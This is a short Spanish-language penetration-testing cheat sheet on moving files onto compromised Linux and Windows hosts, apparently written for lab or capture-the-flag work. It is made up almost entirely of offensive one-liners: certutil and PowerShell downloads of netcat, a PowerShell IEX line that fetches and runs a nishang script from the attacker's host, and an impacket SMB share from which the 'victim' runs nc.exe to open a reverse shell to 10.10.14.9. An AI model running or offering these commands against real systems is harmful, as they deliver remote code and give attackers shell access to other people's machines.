# Transferencia de archivos

## Linux

Descarga recursiva de archivos en FTP:

```bash
wget -r --no-passive ftp://<user>:<password>@<ip>/
```

## Windows

```powershell
certutil.exe -f -urlcache -split http://10.10.14.9/nc.exe nc.exe

# Ejecutar scripts en sesión
powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/nishang.ps1')

# Descargar cualquier tipo de archivo
powershell.exe Invoke-WebRequest -Uri http://10.10.14.9/nc.exe -OutFile nc.exe

# Compartir archivos por smb y ejecutar sin necesidad de descargar
## Escucha / Atacante
impacket-smbserver smbFolder $(pwd) -smb2support
## Ejecución / Victima
cmd /c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 1234
```